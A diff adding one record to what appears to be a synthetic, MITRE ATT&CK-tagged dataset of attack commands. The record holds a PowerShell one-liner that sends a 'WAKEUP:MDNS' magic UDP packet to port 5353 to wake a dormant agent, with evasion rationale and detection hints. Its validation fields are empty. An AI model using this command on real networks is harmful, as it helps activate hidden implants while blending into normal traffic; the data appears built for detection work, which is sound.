@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $target='10.0.0.60'; $udp=New-Object System.Net.Sockets.UdpClient; $udp.Connect($target,5353); $msg=[Text.Encoding]::ASCII.GetBytes('WAKEUP:MDNS'); [void]$udp.Send($msg,$msg.Length); $udp.Close() }",
+  "explanation": "Sends a magic UDP packet with a specific keyword to mDNS port 5353 to signal a dormant agent. Detection: monitor for non-mDNS-formatted payloads to 5353; alert on strings like 'WAKEUP' in UDP content; inspect unusual mDNS traffic between non-mDNS nodes. No elevation required; UAC not triggered.",
+  "rationale_steps": [
+    "Use a well-known multicast service port to blend in.",
+    "Send a magic string the remote listener is programmed to recognize.",
+    "Leverage simple UDP to trigger feature enablement remotely."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-45d83669",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
